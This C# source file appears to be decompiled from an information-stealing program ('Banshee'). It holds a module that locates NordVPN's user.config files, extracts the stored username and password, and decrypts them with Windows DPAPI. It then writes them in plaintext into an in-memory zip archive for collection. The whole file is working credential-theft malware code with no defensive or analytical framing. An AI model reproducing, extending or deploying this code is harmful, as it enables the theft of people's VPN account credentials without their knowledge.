﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using Banshee.Helper.Data;
using Banshee.Helper.Encrypted;

namespace Banshee.Targets.Vpn
{
	// Token: 0x0200002F RID: 47
	public class NordVpn : ITarget
	{
		// Token: 0x06000061 RID: 97 RVA: 0x0000401C File Offset: 0x0000401C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordVPN"));
			if (!directoryInfo.Exists)
			{
				return;
			}
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "NordVPN";
			string text = ZipPath.Vpn("NordVPN");
			try
			{
				foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories("NordVpn.exe*"))
				{
					List<string> list = new List<string>();
					DirectoryInfo[] directories2 = directoryInfo2.GetDirectories();
					for (int j = 0; j < directories2.Length; j++)
					{
						string text2 = Path.Combine(directories2[j].FullName, "user.config");
						if (File.Exists(text2))
						{
							XmlDocument xmlDocument = new XmlDocument();
							xmlDocument.Load(text2);
							XmlNode xmlNode = xmlDocument.SelectSingleNode("//setting[@name='Username']/value");
							string text3 = NordVpn.Decode((xmlNode != null) ? xmlNode.InnerText : null);
							XmlNode xmlNode2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value");
							string text4 = NordVpn.Decode((xmlNode2 != null) ? xmlNode2.InnerText : null);
							if (!string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4))
							{
								list.Add("Username: " + text3 + "\nPassword: " + text4);
							}
						}
					}
					if (list.Count > 0)
					{
						string entryPath = Path.Combine(text, directoryInfo2.Name, "accounts.txt");
						counterApplications.Files.Add(directoryInfo2.FullName + " => " + text + "\\");
						counterApplications.Files.Add(text + "\\");
						zip.AddTextFile(entryPath, string.Join("\n\n", list));
					}
				}
			}
			catch
			{
			}
			counterApplications.Files.Add(text + "\\");
			counter.Vpns.Add(counterApplications);
		}

		// Token: 0x06000062 RID: 98 RVA: 0x000041F8 File Offset: 0x000041F8
		private static string Decode(string s)
		{
			return Encoding.UTF8.GetString(DpApi.Decrypt(Convert.FromBase64String(s))) ?? "";
		}
	}
}
